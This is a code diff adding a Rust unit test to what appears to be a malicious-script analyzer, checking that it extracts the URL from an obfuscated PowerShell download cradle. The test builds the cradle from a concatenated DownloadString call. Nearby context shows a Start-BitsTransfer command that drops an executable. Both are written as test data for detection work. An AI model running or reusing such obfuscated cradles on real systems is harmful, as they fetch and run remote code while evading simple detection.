@@ -19775,6 +19775,25 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn dynamic_downloadstring_concatenated_method_literal_url_extracted() {
+        let ps = r#"$wc=New-Object Net.WebClient;$wc.('Download'+'String').Invoke('https://dyn-concat-method.example/a.ps1')"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://dyn-concat-method.example/a.ps1"
+                )
+            }),
+            "no Download from concatenated dynamic DownloadString method: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn start_bitstransfer_destination_extracted() {
         let ps = r#"Start-BitsTransfer -Source "https://bitsps.example/drop.exe" -Destination "C:\ProgramData\drop.exe""#;
         let script = format!("powershell -Command \"{}\"\r\n", ps);
